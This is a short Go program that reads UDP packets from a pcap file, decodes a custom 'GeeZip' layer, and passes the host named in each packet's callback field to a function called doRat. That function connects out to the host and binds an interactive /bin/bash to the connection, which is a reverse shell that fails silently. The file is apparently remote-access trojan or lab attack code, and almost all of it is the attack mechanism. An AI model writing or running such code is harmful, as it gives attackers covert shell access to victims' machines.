package main

import (
	"log"
	"net"
	"os"
	"os/exec"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

func doRat(host string) {
	conn, err := net.Dial("tcp", host)
	if err != nil {
		return // fail silently
	}
	cmd := exec.Command("/bin/bash", "-i")
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}

func handlePacket(pkt gopacket.Packet) {
	if t := pkt.TransportLayer(); t != nil && t.LayerType() == layers.LayerTypeUDP {
		if app := pkt.ApplicationLayer(); app != nil {
			p := gopacket.NewPacket(app.Payload(), GeeZipLayerType, gopacket.Lazy)
			if p != nil {
				l := p.Layer(GeeZipLayerType)
				doRat(l.(GeeZipLayer).CBString)
			}
		}
	}
}

func main() {
	if len(os.Args) != 2 {
		log.Fatalf("Usage: %s <filename>\n", os.Args[0])
	}

	handle, err := pcap.OpenOffline(os.Args[1])
	if err != nil {
		panic(err)
	}

	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	for packet := range packetSource.Packets() {
		handlePacket(packet) // Do something with a packet here.
	}

	return
}
